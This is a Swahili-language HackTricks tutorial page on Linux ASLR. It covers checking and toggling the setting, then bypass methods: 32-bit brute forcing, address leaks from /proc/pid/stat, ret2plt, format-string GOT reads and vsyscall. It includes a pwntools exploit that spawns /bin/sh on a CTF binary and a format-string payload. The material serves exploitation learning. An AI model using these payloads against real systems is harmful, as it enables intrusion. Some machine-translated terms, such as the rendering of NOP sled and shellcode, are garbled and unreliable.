# ASLR

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

**Urambazaji wa Muundo wa Nafasi ya Anwani (ASLR)** ni mbinu ya usalama inayotumiwa katika mifumo ya uendeshaji kwa **kuchanganya nafasi za kumbukumbu** zinazotumiwa na michakato ya mfumo na maombi. Kwa kufanya hivyo, inafanya iwe ngumu sana kwa mkaidi kutabiri mahali pa michakato na data maalum, kama vile stack, heap, na maktaba, hivyo kupunguza aina fulani za uvamizi, hasa mlipuko wa ujazo.

### **Kuangalia Hali ya ASLR**

Ku **kuchunguza** hali ya ASLR kwenye mfumo wa Linux, unaweza kusoma thamani kutoka faili ya `/proc/sys/kernel/randomize_va_space`. Thamani iliyohifadhiwa kwenye faili hii inaamua aina ya ASLR inayotumiwa:

* **0**: Hakuna kuchanganya. Kila kitu ni tuli.
* **1**: Urambazaji wa kuchagua. Maktaba zilizoshirikiwa, stack, mmap(), ukurasa wa VDSO zinachanganywa.
* **2**: Urambazaji kamili. Mbali na vitu vilivyochanganywa na urambazaji wa kuchagua, kumbukumbu inayosimamiwa kupitia `brk()` inachanganywa.

Unaweza kuangalia hali ya ASLR kwa amri ifuatayo:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Kulemaza ASLR**

Ili **kulemaza** ASLR, weka thamani ya `/proc/sys/kernel/randomize_va_space` kuwa **0**. Kulemaza ASLR kwa ujumla haipendekezwi isipokuwa katika mazingira ya majaribio au kutatua matatizo. Hapa ndivyo unavyoweza kulemaza:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Unaweza pia kulemaza ASLR kwa utekelezaji na:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Kuwezesha ASLR**

Ili **kuwezesha** ASLR, unaweza kuandika thamani ya **2** kwa faili ya `/proc/sys/kernel/randomize_va_space`. Kawaida hii inahitaji mamlaka ya msingi. Kuwezesha ubadilishaji kamili unaweza kufanywa kwa amri ifuatayo:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Uthabiti Kupitia Kuzimwa Upya**

Mabadiliko yaliyofanywa kwa kutumia amri za `echo` ni ya muda na yatarejeshwa wakati wa kuzimwa upya. Ili kufanya mabadiliko yawe ya kudumu, unahitaji kuhariri faili ya `/etc/sysctl.conf` na kuongeza au kuhariri mstari ufuatao:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Baada ya kuhariri `/etc/sysctl.conf`, tumia mabadiliko kwa:
```bash
sudo sysctl -p
```
Hii itahakikisha mipangilio yako ya ASLR inabaki hata baada ya kuzima na kuwasha upya.

## **Kupitisha**

### Kufanya nguvu kwa biti 32

PaX inagawa nafasi ya anwani ya mchakato katika **makundi 3**:

* **Msimbo na data** (iliyoanzishwa na isiyoanzishwa): `.text`, `.data`, na `.bss` ‚Äî> **biti 16** za entropy katika kifaa cha `delta_exec`. Kifaa hiki kinaanzishwa kwa nasibu kila mchakato na kuongezwa kwa anwani za awali.
* **Kumbukumbu** iliyotengwa na `mmap()` na **maktaba zilizoshirikiwa** ‚Äî> **biti 16**, inayoitwa `delta_mmap`.
* **Mtungo** ‚Äî> **biti 24**, inayoitwa `delta_stack`. Walakini, inatumia **biti 11** (kutoka kwa byte ya 10 hadi ya 20 pamoja), imepangwa kwa **byte 16** ‚Äî> Hii inasababisha **anwani halisi 524,288 za mtungo**.

Data iliyotangulia ni kwa mifumo ya biti 32 na entropy ya mwisho iliyopunguzwa inawezesha kupitisha ASLR kwa kujaribu tena na tena hadi shambulio litakapokamilika kwa mafanikio.

#### Mawazo ya kufanya nguvu:

* Ikiwa una kutosha kwa kutosha kuhifadhi **barafu kubwa ya NOP kabla ya msimbo wa kabati**, unaweza tu kufanya nguvu kwa anwani kwenye mtungo hadi mchakato **unapovuka sehemu ya barafu ya NOP**.
* Chaguo lingine kwa hili ikiwa kutosha kwa kutosha si kubwa na shambulio linaweza kutekelezwa kwa ndani ni kuingiza **barafu ya NOP na msimbo wa kabati katika mazingira ya pembejeo**.
* Ikiwa shambulio ni la kienyeji, unaweza kujaribu kufanya nguvu kwa anwani ya msingi ya libc (yenye manufaa kwa mifumo ya biti 32):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Ikiwa unashambulia seva ya mbali, unaweza kujaribu **kuvunja nguvu anwani ya kazi ya `libc` ya `usleep`**, ukitoa kama hoja 10 (kwa mfano). Ikiwa kwa wakati fulani **seva inachukua sekunde 10 zaidi kujibu**, umepata anwani ya kazi hii.

{% hint style="success" %}
Kwenye mifumo ya 64bit entropy ni kubwa zaidi na hili halitowezekana.
{% endhint %}

### Taarifa za Kienyeji (`/proc/[pid]/stat`)

Faili ya **`/proc/[pid]/stat`** ya mchakato daima inaweza kusomwa na kila mtu na ina **taarifa muhimu** kama vile:

* **startcode** & **endcode**: Anwani juu na chini ya **TEXT** ya binary
* **startstack**: Anwani ya kuanzia ya **stack**
* **start\_data** & **end\_data**: Anwani juu na chini ambapo **BSS** iko
* **kstkesp** & **kstkeip**: Anwani za sasa za **ESP** na **EIP**
* **arg\_start** & **arg\_end**: Anwani juu na chini ambapo **cli arguments** ziko.
* **env\_start** & **env\_end**: Anwani juu na chini ambapo **variables za mazingira** ziko.

Hivyo, ikiwa mshambuliaji yupo kwenye kompyuta ile ile kama binary inayotumiwa na hii binary haitegemei kujaa kutoka kwa hoja za raw, lakini kutoka kwa **ingizo ambalo linaweza kutengenezwa baada ya kusoma faili hii**. Ni rahisi kwa mshambuliaji **kupata baadhi ya anwani kutoka kwa faili hii na kujenga offsets kutoka kwao kwa ajili ya shambulio**.

{% hint style="success" %}
Kwa habari zaidi kuhusu faili hii angalia [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) ukisaka `/proc/pid/stat`
{% endhint %}

### Kuwa na uvujaji

* **Changamoto ni kutoa uvujaji**

Ikiwa unapewa uvujaji (changamoto rahisi za CTF), unaweza kuhesabu offsets kutoka kwake (ukidhani kwa mfano unajua toleo sahihi la libc linalotumiwa kwenye mfumo unaoexploit). Shambulio hili la mfano linachukuliwa kutoka kwa [**mfano kutoka hapa**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (angalia ukurasa huo kwa maelezo zaidi):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Kwa kutumia kuzidi kwa buffer, ingewezekana kutumia **ret2plt** kufichua anwani ya kazi kutoka kwa libc. Angalia:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Kama ilivyo kwa ret2plt, ikiwa una usomaji wa kiholela kupitia udhaifu wa format strings, ni rahisi kufichua anwani ya kazi ya **libc** kutoka kwa GOT. Mfano ufuatao [**unapatikana hapa**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Unaweza kupata habari zaidi kuhusu Soma za Fomati za kiholela katika:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

Jaribu kukiuka ASLR kwa kutumia anwani ndani ya steki:

{% content-ref url="ret2ret.md" %}
[ret2ret.md](ret2ret.md)
{% endcontent-ref %}

### vsyscall

Mfumo wa **`vsyscall`** unatumika kuongeza utendaji kwa kuruhusu wito fulani wa mfumo kutekelezwa katika nafasi ya mtumiaji, ingawa kimsingi ni sehemu ya msingi. Faida kuu ya **vsyscalls** iko katika **anwani zao za kudumu**, ambazo hazitawaliwi na **ASLR** (Usanidi wa Nafasi ya Anwani kwa Bahati). Tabia hii ya kudumu inamaanisha kwamba wachomaji hawahitaji udhaifu wa kuvuja kwa habari ili kujua anwani zao na kuzitumia katika shambulio.\
Hata hivyo, hakuna vifaa vya kuvutia sana vitakavyopatikana hapa (ingawa kwa mfano inawezekana kupata sawa na `ret;`)

(Mfano na nambari ifuatayo ni [**kutoka kwenye andiko hili**](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html#exploitation))

Kwa mfano, mchomaji anaweza kutumia anwani `0xffffffffff600800` ndani ya shambulio. Wakati jaribio la kuruka moja kwa moja kwenye maagizo ya `ret` linaweza kusababisha kutokuwa imara au kuzimia baada ya kutekeleza vifaa vichache, kuruka mwanzo wa `syscall` iliyotolewa na sehemu ya **vsyscall** inaweza kufanikiwa. Kwa kuweka kwa uangalifu kifaa cha **ROP** kinachosababisha utekelezaji kwenye anwani hii ya **vsyscall**, mchomaji anaweza kupata utekelezaji wa nambari bila kuhitaji kukiuka **ASLR** kwa sehemu hii ya shambulio.
```
ef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gef‚û§  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
```
<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
